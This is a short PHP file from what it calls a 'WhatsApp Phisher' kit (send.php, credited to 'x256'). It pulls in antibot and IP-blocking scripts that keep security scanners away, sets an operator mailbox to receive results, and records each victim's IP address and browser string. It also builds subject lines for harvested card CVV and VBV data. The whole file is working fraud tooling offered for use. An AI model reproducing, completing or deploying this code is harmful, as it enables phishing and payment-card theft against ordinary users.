<?php
@include("antibots.php");
@include("Block-IP.php");
@include("blocker.php");

/*
 WhatsApp Phisher
 File : send.php
 Coded by x256
 Ask for updates premiumers(at)gmail.com ;)
*/

$rezltMail = "wh004mi@zoho.com"; // Ur Email Here

$TxtStore  = "0";   // (0/1) turn ON/OFF txt report

$ip = $_SERVER["REMOTE_ADDR"];
$uagent = $_SERVER["HTTP_USER_AGENT"];
$date = date("d/m/Y h:m");

$rezlTitleCvv = "XR4NG WhatsApp Rezult CVV From : [ $ip ]";
$rezlTitleVbv = "XR4NG WhatsApp Rezult VBV From : [ $ip ]";
?>